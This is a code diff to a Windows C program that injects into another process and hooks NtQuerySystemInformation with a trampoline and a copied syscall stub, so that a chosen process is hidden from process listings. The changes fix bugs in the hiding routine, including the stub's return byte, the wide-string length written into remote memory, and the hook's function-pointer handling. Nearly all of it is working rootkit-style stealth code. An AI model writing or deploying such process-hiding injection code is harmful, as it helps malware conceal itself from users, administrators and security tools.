@@ -57,13 +57,15 @@ DWORD GetProcessIdByImageName(wchar_t *ProcessName)
 
 BOOL ProcessStealth(wchar_t *TargetProcessName, wchar_t *HideProcessName)
 {
-    BYTE Syscall[16] = {0x4C, 0x8B, 0xD1, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x05};
+    BYTE Syscall[16] = {0x4C, 0x8B, 0xD1, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3};
 
     BYTE TrampolineCode[12] = { 0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xE0 };
 
     DWORD TargetPID = GetProcessIdByImageName(TargetProcessName);
 
     HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, TargetPID);
+
+    PVOID NtQuerySystemInformation = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
 
     if (hProcess == NULL)
     {
@@ -107,7 +109,7 @@ BOOL ProcessStealth(wchar_t *TargetProcessName, wchar_t *HideProcessName)
 
     PVOID ProcessName = (ULONGLONG)SyscallClone + 16;
 
-    if (WriteProcessMemory(hProcess, ProcessName, HideProcessName, wcslen(HideProcessName), &NumberOfBytesWritten) == FALSE)
+    if (WriteProcessMemory(hProcess, ProcessName, HideProcessName, wcslen(HideProcessName) * 2, &NumberOfBytesWritten) == FALSE)
     {
         printf("[-] WriteProcessMemory Failed!\n");
         printf("[*] GetLastError : %d\n", GetLastError());
@@ -121,12 +123,12 @@ BOOL ProcessStealth(wchar_t *TargetProcessName, wchar_t *HideProcessName)
         return FALSE;
     }
 
-    if (WriteProcessMemory(hProcess, (ULONGLONG)NewFunction + SearchOverwriteOffset(NewNtQuerySystemInformation), &ProcessName, 8, &NumberOfBytesWritten) == FALSE)
+    /*if (WriteProcessMemory(hProcess, (ULONGLONG)NewFunction + SearchOverwriteOffset(NewNtQuerySystemInformation), &ProcessName, 8, &NumberOfBytesWritten) == FALSE)
     {
         printf("[-] WriteProcessMemory Failed!\n");
         printf("[*] GetLastError : %d\n", GetLastError());
         return FALSE;
-    }
+    }*/
 
     DWORD OldProtect;
 
@@ -159,9 +161,9 @@ DWORD SearchOverwriteOffset(PVOID Address)
 
 NTSTATUS NTAPI NewNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
 {
-    volatile BYTE(NTAPI * CloneNtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength) = 0xCCCCCCCCCCCCCCCC;
-    volatile wchar_t *HideProcessName = 0xCCCCCCCCCCCCCCCC;
-    NTSTATUS ntstatus = CloneNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
+    volatile NTSTATUS *CloneNtQuerySystemInformation = 0xCCCCCCCCCCCCCCCC;
+    wchar_t *HideProcessName = (ULONGLONG)CloneNtQuerySystemInformation + 16;
+    NTSTATUS ntstatus = ((NTSTATUS(*)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength))CloneNtQuerySystemInformation)(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
 
     if (ntstatus != STATUS_SUCCESS)
     {
